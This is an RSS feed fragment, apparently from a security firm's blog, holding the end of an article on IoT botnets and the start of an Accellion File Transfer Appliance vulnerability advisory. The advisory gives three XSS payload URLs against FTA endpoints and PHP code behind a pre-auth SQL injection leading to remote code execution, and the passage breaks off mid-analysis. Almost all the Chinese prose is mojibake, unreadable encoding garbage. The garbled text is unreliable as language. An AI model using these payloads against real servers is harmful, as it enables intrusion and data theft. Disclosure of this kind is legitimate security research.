&lt;p&gt;Á©∂Á´üÊòØÊÄéÊ®£ÁöÑÂÆâÂÖ®ÊºèÊ¥ûËÆìÊîªÊìäËÄÖÈÄôÈ∫ºËºïÊòìÂà©Áî®Âë¢ÔºüÁõÆÂâçÊîªÊìäËÄÖÂèä botnet Â§öÊï∏Âà©Áî®ÁöÑÈÇÑÊòØ‰ΩøÁî®È†êË®≠ÂØÜÁ¢º„ÄÅÊàñÁîöËá≥ÊòØÊ≤íÊúâË®≠ÂÆöÂØÜÁ¢ºÁöÑË£ùÁΩÆ„ÄÇÁ∂≤Á´ô &lt;a href=&quot;https://www.insecam.org&quot;&gt;Insecam&lt;/a&gt; Êè≠Èú≤‰∫ÜÂÖ®‰∏ñÁïåÊï∏Ëê¨ÊîØÊú™‰øÆÊîπÂØÜÁ¢ºÁöÑÊîùÂΩ±Ê©üÔºåÂÜçÂÜçÈ°ØÁ§∫‰∏çÂ∞ëÊ∞ëÁúæÊàñÂÖ¨Âè∏Ë°åËôüË≥ºË≤∑‰∫ÜÁõ£Ë¶ñÂô®ÔºåÂçªÊ≤íÊúâÂÅ•ÂÖ®ÁöÑË≥áÂÆâÊÑèË≠òÔºåËÆìÁõ£Ë¶ñÂô®Êö¥Èú≤ÊñºÂÖ®‰∏ñÁïå‰πã‰∏≠„ÄÇÊõ¥Â§öÊîùÂΩ±Ê©ü„ÄÅÁõ£Ë¶ñÂô®Á≠âÁöÑË≥áÂÆâË≠∞È°åÂèØ‰ª•ÂèÉËÄÉÊàëÂÄëÁöÑÊñáÁ´†&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;„ÄåÁ∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR ÁöÑË≥áÂÆâË≠∞È°å - ‰Ω†Áü•ÈÅìÊàëÂú®Áúã‰Ω†ÂóéÔºü„Äç&lt;/a&gt;„ÄÇÈô§‰∫ÜÈ†êË®≠ÂØÜÁ¢º‰πãÂ§ñÔºåË®≠ÂÇô‰∏≠ÁöÑÂæåÈñÄ‰πüÊòØ‰∏ÄÂÄãÂ§ßÂïèÈ°å„ÄÇ‰∏çÂ∞ëË∑ØÁî±Âô®„ÄÅÁÑ°Á∑öÂü∫Âú∞Âè∞Âª†ÂïÜË¢´ÁàÜÂá∫Á≥ªÁµ±‰∏≠Âê´ÊúâÊ∏¨Ë©¶Áî®ÁöÑÁôªÂÖ•Â∏≥ËôüÔºåË©≤Â∏≥ËôüÁÑ°Ê≥ïÈóúÈñâ„ÄÅÁÑ°Ê≥ïÁßªÈô§Ôºå‰∏îÂÆπÊòìË¢´ÊîªÊìäËÄÖÈÄ≤Ë°åÁ†îÁ©∂ÂèñÂæó„ÄÇÈô§‰∫ÜÁ≠âÂæÖÂª†ÂïÜÂçáÁ¥öÈüåÈ´î‰æÜ‰øÆË£úË©≤ÂïèÈ°å‰πãÂ§ñÔºåÊ≤íÊúâÂÖ∂‰ªñËß£Ê≥ïÔºåÂõ†Ê≠§ÊàêÁÇ∫ÊîªÊìäËÄÖÂ§ßÈáèÂèñÂæóÊéßÂà∂Ê¨äÁöÑÊñπÂºè‰πã‰∏Ä„ÄÇ&lt;/p&gt;

&lt;p&gt;IoT Ë£ùÁΩÆÁÇ∫‰ªÄÈ∫ºÊúÉÊàêÁÇ∫ÊîªÊìäËÄÖ‰∏ãÊâãÁöÑÁõÆÊ®ôÂë¢ÔºüÊàëÂÄëÂèØ‰ª•ÂàÜÊàêÂπæÈªû‰æÜÊé¢Ë®é„ÄÇ&lt;/p&gt;

&lt;p&gt;Á¨¨‰∏ÄÔºåÂµåÂÖ•ÂºèË£ùÁΩÆ‰ª•ÂæÄÁöÑË®≠Ë®àÈÉΩÊòØ‰∏çÈÄ£Á∂≤ÔºåIoT ÁöÑÈ¢®ÊΩÆËààËµ∑‰πãÂæåÔºåÂêÑÂª†ÂïÜ‰πüÁÇ∫‰∫ÜÊê∂Â∏ÇÂ†¥ÂÖàÊ©üÔºåÂä†ÈÄüÊé®Âá∫Áî¢ÂìÅÔºåÂ∞áÂéüÊú¨ÁöÑÁî¢ÂìÅÂä†‰∏äÁ∂≤Ë∑ØÂäüËÉΩÔºåÁîöËá≥ App ÊéßÂà∂ÂäüËÉΩ„ÄÇËÄåÊ±ÇÂø´ÁöÑÁµêÊûúÂ∞±ÊòØÁäßÁâ≤Ë≥áÂÆâËÄÉÈáèÔºåÂä†‰∏äÂª†ÂïÜÂèØËÉΩÂéüÊú¨‰∏¶ÈùûÁ∂≤Ë∑ØÂ∞àÈï∑Ôºå‰πüÊ≤íÊúâË∂≥Â§†ÁöÑË≥áÂÆâ‰∫∫Âì°Ê™¢Ë¶ñÂÆâÂÖ®ÊÄßÔºåÂ∞éËá¥Ë®≠Ë®àÂá∫‰æÜÁöÑÁî¢ÂìÅË≥áÂÆâÊºèÊ¥ûÂ±§Âá∫‰∏çÁ™Æ„ÄÇÁî¢ÂìÅÁöÑË®≠Ë®àÂøÖÈ†àÂö¥ÂÆà Security by Design ÁöÑÂéüÂâáÔºåÂú®ÈñãÁôºÂàùÊúüÁöÑÊØèÂÄãÁí∞ÁØÄÈÉΩÁ¥çÂÖ•Ë≥áÂÆâËÄÉÈáèÔºå‰∏¶‰∏îÈÅµÂÆà Secure Coding Ë¶èÁØÑÔºåÈÅøÂÖçÂú®Áî¢ÂìÅÂæåÊúüÁñäÂ∫äÊû∂Â±ãÔºåÈÄ†ÊàêË¶ÅÈáêÊ∏ÖË≥áÂÆâÂïèÈ°åÁöÑÊ†πÊ∫êÊõ¥Èõ£Â¶ÇÁôªÂ§©„ÄÇ&lt;/p&gt;

&lt;p&gt;Á¨¨‰∫åÔºåÁî¢ÂìÅÁöÑÊõ¥Êñ∞Ê©üÂà∂ÂïèÈ°å„ÄÇIoT Ë£ùÁΩÆÁöÑÊõ¥Êñ∞Ê©üÂà∂Âú®Êó©Êúü‰∏¶Ê≤íÊúâË¨πÊÖéËÄÉÈáèÔºåÈúÄË¶Å‰ΩøÁî®ËÄÖËá™Ë°å‰∏ãËºâÈüåÈ´îÊõ¥Êñ∞ÔºåÁîöËá≥Êúâ‰∫õË£ùÁΩÆÂøÖÈ†àÂõûÂª†ÊâçËÉΩÈÄ≤Ë°åÊõ¥Êñ∞„ÄÇ‰∏çÂ∞ë‰ΩøÁî®ËÄÖÂè™Ë¶ÅÁî¢ÂìÅÊ≤íÊúâÂá∫ÂïèÈ°åÔºå‰∏¶‰∏çÊúÉ‰∏ªÂãïÈÄ≤Ë°åÈüåÈ´îÊõ¥Êñ∞ÔºåÁîöËá≥Ë¶∫ÂæóÊõ¥Êñ∞Âè™ÊúÉÈÄ†ÊàêÊõ¥Â§öÂïèÈ°å„ÄÇÂú®Ê≤íÊúâ‰æøÂà©Êõ¥Êñ∞Ê©üÂà∂ÁöÑÊÉÖÊ≥Å‰πã‰∏ãÔºåË®≠ÂÇôÁöÑË≥áÂÆâÂïèÈ°åÊõ¥Èõ£‰ª•Ë¢´Â¶•ÂñÑËôïÁêÜ„ÄÇËøëÊúüÂõ†ÁÇ∫Ë≥áÂÆâ‰∫ã‰ª∂È†ªÂÇ≥ÔºåFOTA (Firmware Over-The-Air) Ê©üÂà∂ÊâçÈÄêÊº∏Ë¢´ÈáçË¶ñÔºå‰ΩÜÂÖ∂‰ªñË≥áÂÆâÂïèÈ°å‰πüÈö®Âç≥ËÄå‰æÜ„ÄÇÂ¶Ç‰ΩïÁ¢∫‰øùÈüåÈ´îÁöÑÂÆåÊï¥ÊÄßÔºüÂ¶Ç‰ΩïÈò≤Ê≠¢ÊîªÊìäËÄÖ‰∏ãËºâÈüåÈ´îÈÄ≤Ë°åÁ†îÁ©∂‰øÆÊîπÔºüÈÄô‰∫õÈÉΩÊòØÂª†ÂïÜÈúÄË¶Å‰∏çÊñ∑ÂéªÂèçË¶ÜÊÄùÈáèÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;Á¨¨‰∏âÔºåÊïµÊöóÊàëÊòéÔºå‰πüÊòØÊàëÂÄëË™çÁÇ∫ÊúÄÈáçË¶ÅÁöÑ‰∏ÄÈªû„ÄÇÊàëÂÄëË™çÁÇ∫Ë≥áÂÆâÂ∞±ÊòØÊîªÊìäËÄÖËàáÈò≤Á¶¶ËÄÖÁöÑ‰∏ÄÂ†¥Ë≥áË®ä‰∏çÂ∞çÁ®±Êà∞Áà≠ÔºåÈò≤Á¶¶ËÄÖÔºàÂª†ÂïÜÔºâÈÄöÂ∏∏Âè™ÊúÉÊÜëËóâËëóËá™Â∑±ÁöÑÁü•Ë≠òË∑üÊÉ≥ÂÉèÈÄ≤Ë°åÈò≤Á¶¶Ôºå‰ΩÜÂçª‰∏çÁü•ÈÅìÊîªÊìäËÄÖÁöÑÊÄùÁ∂≠Ë∑üÊâãÊ≥ï„ÄÇÂ∞±ÂÉèÊò•ÁßãÊôÇ‰ª£ÂÖ¨Ëº∏Ëà¨ÔºåÂª∫ÈÄ†Èõ≤Ê¢ØÂçîÂä©Ê•öÂúãÊîªÊìäÂÆãÂúãÁöÑÂüéÊ±†„ÄÇÂîØÊúâ‰∫ÜËß£ÊîªÊìäËÄÖÔºåÂåñËß£ÈÄôÂÄã‰∏çÂ∞çÁ®±ÁöÑË≥áË®äÔºåÊâçËÉΩÊúâÊïàÁöÑÈÄ≤Ë°åÈò≤Á¶¶ÔºåÂ¶ÇÂêåÂ¢®Â≠ê‰∫ÜËß£Èõ≤Ê¢ØÁöÑÊîªÊìäÊñπÂºèÔºåÊ®°Êì¨ÂêÑÁ®ÆÂ∞çÊáâÈò≤Á¶¶ÁöÑÊâãÊ≥ïÔºåÊâçÊàêÂäüËÆìÊ•öÁéãÊîæÊ£ÑÊîªÊìä„ÄÇ‰∏çÂÉÖÊòØ IoT Âª†ÂïÜÔºåÊâÄÊúâ‰ºÅÊ•≠ÈÉΩÂøÖÈ†à‰∫ÜËß£ÊîªÊìäËÄÖÁöÑÊÄùÁ∂≠„ÄÅÊâãÊ≥ïÔºåÁü•ÊõâÈÄôÂÄãÈªëËâ≤Áî¢Ê•≠ÁöÑÈÅã‰ΩúÔºåÁîöËá≥ÈáùÂ∞çÊîªÊìäÁöÑÊñπÂºèÈÄ≤Ë°åÊ®°Êì¨ÊºîÁ∑¥ÔºåÂ∞áÊØè‰∏ÄÂÄãÈò≤Á¶¶ÁöÑÁº∫Âè£Ë£úË∂≥ÔºåÊâçÂèØ‰ª•Ê≠£Èù¢ËøéÊà∞ÊîªÊìäËÄÖ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ë®≠ÂÇôÂïÜÈÅøÂÖçÊàêÁÇ∫Âπ´Âá∂Ê∂àË≤ªËÄÖ‰πüÊáâËá™‰øù&quot;&gt;Ë®≠ÂÇôÂïÜÈÅøÂÖçÊàêÁÇ∫Âπ´Âá∂ÔºåÊ∂àË≤ªËÄÖ‰πüÊáâËá™‰øù&lt;/h3&gt;

&lt;p&gt;Ë∫´ÁÇ∫‰ΩøÁî®ËÄÖÔºåÊàëÂÄëË©≤Â¶Ç‰ΩïÁ¢∫Ë™çËá™Â∑±ÁöÑË®≠ÂÇôÊúâÊ≤íÊúâË¢´ÊÑüÊüìÂë¢ÔºüËã•Ë¢´ÊÑüÊüìË©≤ÊÄéÈ∫ºÊúâÊïàÊ∏ÖÈô§Âë¢ÔºüÂª∫Ë≠∞ÂÖàÊêúÂ∞ãÁ∂≤Ë∑Ø‰∏äÁõÆÂâçÂ∑≤ÂÖ¨ÈñãÊúâÊºèÊ¥ûÁöÑÂª†ÁâåÂèäÂûãËôüÔºåËã•Âú®ÂïèÈ°åÊ∏ÖÂñÆ‰πãÂÖßÔºåÂÖàÂ∞áÊï¥Âè∞Ë®≠ÂÇôÂÇô‰ªΩË®≠ÂÆöÂæåÔºåÂõûÂæ©ÂéüÂª†ÂàùÂßãË®≠ÂÆöÔºå‰ª•Á¢∫‰øùÊîªÊìäËÄÖÊîæÁΩÆÁöÑÊÉ°ÊÑèÁ®ãÂºèÈÉΩË¢´Ê∏ÖÈô§„ÄÇÊé•ËëóÊõ¥Êñ∞Âª†ÂïÜÊâÄÈáãÂá∫ÁöÑÊñ∞ÁâàÈüåÈ´îÔºå‰∏¶Ë®òÂæóÂú®Êõ¥Êñ∞ÂÆâË£ùÂÆåÁï¢ÂæåÁ´ãÂç≥Êõ¥ÊèõÂØÜÁ¢º‰ª•Èò≤‰∫åÂ∫¶Ë¢´ÂÖ•‰æµ„ÄÇËã•Âª†ÂïÜÁÑ°ÈáãÂá∫Êõ¥Êñ∞ÔºåÂèØËÉΩÊòØË≥áÂÆâ‰∏çË¢´ÈáçË¶ñÔºå‰πüÂèØËÉΩÊòØÂª†ÂïÜÂ∑≤Á∂ìÁµêÊùüÁáüÈÅã„ÄÇÂ¶ÇÊûúÈÇÑÊòØÈÅ∏ÊìáË¶Å‰ΩøÁî®ÈÄôÂÄãË®≠ÂÇôÔºåÂª∫Ë≠∞Â∞áË®≠ÂÇôËΩâÊîæÂú®ÂÖßÈÉ®Á∂≤Ë∑ØÔºåÊàñËÄÖÊòØÂú®ÂâçÈù¢Â¢ûÂä†Èò≤Á¶¶Ë®≠ÂÇôÔºåÈÅøÂÖçÊîªÊìäËÄÖÂÖ•‰æµ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëá≥ÊñºÂª†ÂïÜË©≤ÊÄéÈ∫ºË∑ü‰∏äË≥áÂÆâÁöÑËÖ≥Ê≠•Âë¢ÔºüÊàëÂÄëË™çÁÇ∫ÁõÆÂâçÂª†ÂïÜÊúÄÈáçË¶ÅÁöÑÂ∞±ÊòØË≥áÂÆâÊÑèË≠ò„ÄÇÈÄôÂ∑≤Á∂ìÊòØËÄÅÁîüÂ∏∏Ë´áÔºå‰ª•ÂæÄÁ∂≤Ë∑ØÁî¢Ê•≠ÈÄêÊº∏ÈáçË¶ñË≥áÂÆâÔºå‰ΩÜË∑®ÂÖ•Á∂≤Ë∑ØÁöÑÂÖ∂‰ªñË≥áË®äÁî¢Ê•≠ÊÅêÊÄïÈÇÑÊ≤íÊÑèË≠òÂà∞Ë≥áÂÆâÁöÑÂö¥ÈáçÊÄß„ÄÇÂá°ËàâÂÇ≥Áµ±ÂÆ∂ÈõªËΩâÁÇ∫Êô∫ÊÖßÂÆ∂Èõª„ÄÅËªäËºõËΩâÁÇ∫Êô∫ÊÖßËªäËºõ„ÄÅÁîöËá≥Âü∫Á§éÂª∫Ë®≠‰πüÈÄêÊº∏Ë≥áË®äÂåñÁöÑÁèæÂú®ÔºåËã•ÈÄô‰∫õË∏èÂÖ•Á∂≤Ë∑ØÁöÑÁî¢Ê•≠Ê≤íÊúâÁõ∏Â∞çÊáâÁöÑË≥áÂÆâÊÑèË≠òÔºåÊÅêÊÄïÂæàÈõ£Âú®ÂàùÊúüÂ∞±È†êÈò≤È¢®Èö™ÁöÑÁôºÁîü„ÄÇ‰ºÅÊ•≠‰πüÂøÖÈ†àÁõ§ÈªûÈ¢®Èö™ÁöÑÊâÄÂú®ÔºåÈÄèÈÅé‰∫∫Â∑•Êª≤ÈÄèÊ∏¨Ë©¶Ê®°Êì¨ÊîªÊìäËÄÖÁöÑÊîªÊìäÊÄùÁ∂≠ÂèäË∑ØÂæëÔºåÂ¶ÇÂêåËªç‰∫ãÊºîÁøí‰∏ÄËà¨ÔºåÂ∞áÂÖ•‰æµÁöÑÈÄîÂæë‰∏Ä‰∏ÄÂ∞ÅÈéñ„ÄÇÊàëÂÄëË™çÁÇ∫ IoT Á≠âÂµåÂÖ•ÂºèË£ùÁΩÆ„ÄÅÊô∫ÊÖßÂÆ∂Èõª„ÄÅÁîöËá≥Á∂≤ÈÄöË≥áÂÆâË®≠ÂÇôÊú¨Ë∫´ÔºåÊú™‰æÜÈÉΩÊúÉÊòØÈß≠ÂÆ¢ÁµÑÁπîÊîªÊìäÁöÑÂ∞çË±°ÔºåÂà©Áî®Êõ¥Êñ∞ÁöÑÂõ∞Èõ£Â∫¶Ë∑üÁÆ°ÁêÜËÄÖÁöÑÁñèÊñºÁÆ°ÁêÜÔºåÂª∫ÁΩÆ‰∏ÄÂÄãÂÄãÂ§ßË¶èÊ®°ÊÆ≠Â±çÂ§ßËªçÔºåÊàêÁÇ∫Êú™‰æÜÊà∞Áà≠ÁöÑÊ£ãÂ≠ê„ÄÇÊàëÂÄëÊúüË®±Êú™‰æÜÂª†ÂïÜÂª∫ÊßãÁî¢ÂìÅÊôÇÔºåÈÉΩËÉΩÂÑ™ÂÖàÁ¥çÂÖ•Ë≥áÂÆâËÄÉÈáèÔºå‰∏çÊàêÁÇ∫ÈªëËâ≤Áî¢Ê•≠ÁöÑÂπ´Âá∂Ôºå‰πüËÆìÂúãÈöõË™çÂèØÂè∞ÁÅ£Áî¢ÂìÅÊòØË≥áÂÆâËá≥‰∏äÁöÑÂÑ™ËâØÂìÅË≥™„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/</link>
                <guid>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks</guid>
                <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Accellion File Transfer Appliance Âº±ÈªûÂ†±Âëä</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt; &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;accellion-fta-‰ªãÁ¥π&quot;&gt;Accellion FTA ‰ªãÁ¥π&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Accellion File Transfer Appliance (‰ª•‰∏ãÁ∞°Á®± FTA) ÁÇ∫‰∏ÄÊ¨æÂÆâÂÖ®Ê™îÊ°àÂÇ≥Ëº∏ÊúçÂãôÔºåÂèØËÆì‰ΩøÁî®ËÄÖÁ∑ö‰∏äÂàÜ‰∫´„ÄÅÂêåÊ≠•Ê™îÊ°àÔºå‰∏îÊâÄÊúâÊ™îÊ°àÁöÜÁ∂ì AES 128/256 Âä†ÂØÜÔºåEnterprise ÁâàÊú¨Êõ¥ÊîØÊè¥ SSL VPN ÊúçÂãô‰∏¶Êï¥Âêà AD, LDAP, Kerberos Á≠â Single Sign-on Ê©üÂà∂„ÄÇ
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÊºèÊ¥ûÊèèËø∞&quot;&gt;ÊºèÊ¥ûÊèèËø∞&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Âú®Á†îÁ©∂ÈÅéÁ®ã‰∏≠ÔºåÊñº FTA ÁâàÊú¨ FTA_9_12_0 (13-Oct-2015 Release) ‰∏äÔºåÁôºÁèæ‰∫Ü‰∏ãÂàóÂº±ÈªûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ª•‰∏äÂº±ÈªûÂèØ‰Ωø‰∏çÈúÄÁ∂ìÈÅéË™çË≠âÁöÑÊîªÊìäËÄÖÔºåÊàêÂäüÈÅ†Á´ØÊîªÊìä FTA ‰º∫ÊúçÂô®‰∏¶ÂèñÂæóÊúÄÈ´òÊ¨äÈôêÔºåÁï∂ÊîªÊìäËÄÖÂÆåÂÖ®ÊéßÂà∂‰º∫ÊúçÂô®ÂæåÔºåÂèØÂèñÂæó‰º∫ÊúçÂô®‰∏äÁöÑÂä†ÂØÜÊ™îÊ°àËàáÁî®Êà∂Ë≥áÊñôÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;Âº±ÈªûÁ∂ìÂõûÂ†± CERT/CC ÂæåÂèñÂæóÂÖ±ÂõõÂÄãÁç®Á´ã CVE Á∑®Ëôü (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)„ÄÇ
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂΩ±ÈüøÁØÑÂúç&quot;&gt;ÂΩ±ÈüøÁØÑÂúç&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Ê†πÊìöÂÖ¨ÈñãË≥áÊñôÊéÉÊèèÔºåÂÖ®ÁêÉÂÖ±ÁôºÁèæ 1217 Âè∞ FTA Â≠òÊ¥ª‰∏ªÊ©üÔºå‰∏ªË¶ÅÂàÜÂ∏ÉÂú∞ÈªûÁÇ∫ÁæéÂúãÔºåÂÖ∂Ê¨°Âä†ÊãøÂ§ß„ÄÅÊæ≥Ê¥≤„ÄÅËã±ÂúãËàáÊñ∞Âä†Âù°„ÄÇÊ†πÊìöÂ≠òÊ¥ª‰∏ªÊ©üÁöÑÂüüÂêç„ÄÅSSL Certificate ÁôºÁèæ FTA ‰ΩøÁî®ÂÆ¢Êà∂ÈÅçÂèäÊîøÂ∫ú„ÄÅÊïôËÇ≤„ÄÅ‰ºÅÊ•≠Á≠âÈ†òÂüüÔºåÂÖ∂‰∏≠‰∏ç‰πè‰∏Ä‰∫õÁü•ÂêçÂìÅÁâå„ÄÇ
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÊºèÊ¥ûÂàÜÊûêËàáÂà©Áî®&quot;&gt;ÊºèÊ¥ûÂàÜÊûêËàáÂà©Áî®&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;
?f2=‚Äô-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;
?documentname=‚Äùonerror=‚Äùprompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;
?msg=ssologout&lt;br /&gt;
&amp;amp;loginurl=‚Äù&amp;gt;&amp;lt;svg/onload=‚Äùprompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;Á∂ìÈÅé‰ª£Á¢ºÂØ©Êü•ÂæåÔºåÂú® FTA ‰∏≠ÁôºÁèæ‰∏ÄÂÄã‰∏çÈ†àÈ©óË≠âÁöÑ SQL InjectionÔºåÈÄô‰ΩøÂæóÊÉ°ÊÑè‰ΩøÁî®ËÄÖÂèØÈÄèÈÅé SQL Injection Â≠òÂèñ‰º∫ÊúçÂô®ÁöÑÊïèÊÑüÊ™îÊ°àÂèäÂÄã‰∫∫Ë≥áÊñôÔºå‰∏¶ÈÖçÂêàÊ¨äÈôêË®≠ÂÆöÂïèÈ°åÂ∞éËá¥ÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å„ÄÇÂïèÈ°åÂá∫Âú® security_key2.api ‰∏≠ÊâÄÂëºÂè´Âà∞ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; ÂáΩÊï∏‰∏≠ÔºÅ&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$password&lt;/code&gt; ÁöÜÁÇ∫ÊîªÊìäËÄÖÂèØÊéßÂèÉÊï∏ÔºåÈõñÁÑ∂ÊúâÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; ÂáΩÊï∏Â∞çÂØÜÁ¢ºÈÄ≤Ë°åËôïÁêÜÔºå‰ΩÜÊòØËàáÂº±ÈªûËß∏Áôº‰∏¶ÁÑ°Áõ∏Èóú„ÄÇÂÖ∂‰∏≠Ë¶ÅÊ≥®ÊÑèÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; ÁöÑÂÄºÊúÉË¢´‰ª£ÂÖ•ÊàêÂÖ®ÂüüËÆäÊï∏Ôºå‰ª£Ë°®Áï∂Ââç‰ΩøÁî®ÁöÑ Application IDÔºå‰∏¶‰∏îÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; ‰ΩøÁî®ÔºåÂÖ∂‰∏≠Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; ÂÖßÊúâ‰ª•‰∏ã‰ª£Á¢ºÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

